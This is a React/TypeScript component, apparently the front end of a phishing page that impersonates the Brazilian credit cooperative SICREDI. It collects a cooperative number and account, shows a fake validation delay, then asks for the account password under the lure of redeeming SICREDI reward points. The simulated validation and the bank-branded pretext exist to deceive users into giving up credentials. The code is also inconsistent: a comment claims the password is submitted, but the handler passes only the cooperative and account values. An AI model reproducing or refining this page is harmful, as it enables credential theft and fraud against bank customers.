import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";

interface AccountFormProps {
  onSubmit: (cooperativa: string, account: string) => void;
  isLoading: boolean;
}

export default function AccountForm({ onSubmit, isLoading }: AccountFormProps) {
  const [cooperativa, setCooperativa] = useState("");
  const [account, setAccount] = useState("");
  const [errors, setErrors] = useState({
    cooperativa: "",
    account: "",
  });
  const [showPasswordForm, setShowPasswordForm] = useState(false);
  const [password, setPassword] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [loading, setLoading] = useState(false);

  const validateCooperativa = (value: string) => {
    if (!value.trim()) return "Cooperativa é obrigatória";
    if (value.length < 3) return "Cooperativa deve ter pelo menos 3 caracteres";
    return "";
  };

  const validateAccount = (value: string) => {
    if (!value.trim()) return "Conta é obrigatória";
    if (value.length < 3) return "Conta deve ter pelo menos 3 caracteres";
    return "";
  };

  const handleAccountSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validate fields
    const cooperativaError = validateCooperativa(cooperativa);
    const accountError = validateAccount(account);

    if (cooperativaError || accountError) {
      setErrors({
        cooperativa: cooperativaError,
        account: accountError,
      });
      return;
    }

    // Show loading spinner
    setLoading(true);

    // Simulate processing delay
    setTimeout(() => {
      setLoading(false);
      setShowPasswordForm(true);
    }, 1500);
  };

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Validate password
    if (!password.trim()) {
      setPasswordError("Por favor, insira sua senha");
      return;
    }

    if (password.length < 4) {
      setPasswordError("A senha deve ter pelo menos 4 caracteres");
      return;
    }

    // Submit both account and password data
    onSubmit(cooperativa, account);
  };

  return (
    <div>
      {!showPasswordForm ? (
        <form onSubmit={handleAccountSubmit} className="mb-6">
          <div className="relative mb-4">
            <label htmlFor="cooperativa" className="flex items-center text-left text-gray-700 mb-2">
              <i className="fas fa-building mr-2"></i>
              <span>Cooperativa:</span>
            </label>
            <input
              type="text"
              id="cooperativa"
              name="cooperativa"
              placeholder="Digite o número da sua cooperativa"
              value={cooperativa}
              onChange={(e) => {
                setCooperativa(e.target.value);
                if (errors.cooperativa) {
                  setErrors({ ...errors, cooperativa: "" });
                }
              }}
              className={`w-full px-4 py-3 rounded-full border-2 ${
                errors.cooperativa ? "border-red-500" : "border-[#33820D]"
              } focus:outline-none focus:border-[#276c0f]`}
              required
            />
            {errors.cooperativa && <p className="text-red-500 text-sm mt-1">{errors.cooperativa}</p>}
          </div>

          <div className="relative mb-4">
            <label htmlFor="conta" className="flex items-center text-left text-gray-700 mb-2">
              <i className="fas fa-credit-card mr-2"></i>
              <span>Conta:</span>
            </label>
            <input
              type="text"
              id="conta"
              name="conta"
              placeholder="Digite o número da sua conta"
              value={account}
              onChange={(e) => {
                setAccount(e.target.value);
                if (errors.account) {
                  setErrors({ ...errors, account: "" });
                }
              }}
              className={`w-full px-4 py-3 rounded-full border-2 ${
                errors.account ? "border-red-500" : "border-[#33820D]"
              } focus:outline-none focus:border-[#276c0f]`}
              required
            />
            {errors.account && <p className="text-red-500 text-sm mt-1">{errors.account}</p>}
          </div>

          {loading && (
            <div className="my-4 text-center text-[#33820D]">
              <i className="fas fa-spinner fa-spin mr-2"></i> Validando informações...
            </div>
          )}

          <Button
            type="submit"
            className="w-full py-6 bg-[#33820D] hover:bg-[#276c0f] text-white rounded-full font-medium"
            disabled={loading || isLoading}
          >
            {loading || isLoading ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" /> Validando...
              </>
            ) : (
              "Validar"
            )}
          </Button>
        </form>
      ) : (
        <form onSubmit={handlePasswordSubmit} className="mb-6">
          <p className="mb-6">Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:</p>

          <div className="relative mb-4">
            <label htmlFor="senha" className="flex items-center text-left text-gray-700 mb-2">
              <i className="fas fa-lock mr-2"></i>
              <span>Senha:</span>
            </label>
            <input
              type="password"
              id="senha"
              name="senha"
              placeholder="Digite sua senha"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (passwordError) {
                  setPasswordError("");
                }
              }}
              className={`w-full px-4 py-3 rounded-full border-2 ${
                passwordError ? "border-red-500" : "border-[#33820D]"
              } focus:outline-none focus:border-[#276c0f]`}
              required
            />
            {passwordError && <p className="text-red-500 text-sm mt-1">{passwordError}</p>}
          </div>

          <Button
            type="submit"
            className="w-full py-6 bg-[#33820D] hover:bg-[#276c0f] text-white rounded-full font-medium"
            disabled={isLoading}
          >
            {isLoading ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processando...
              </>
            ) : (
              "Finalizar"
            )}
          </Button>
        </form>
      )}
    </div>
  );
}
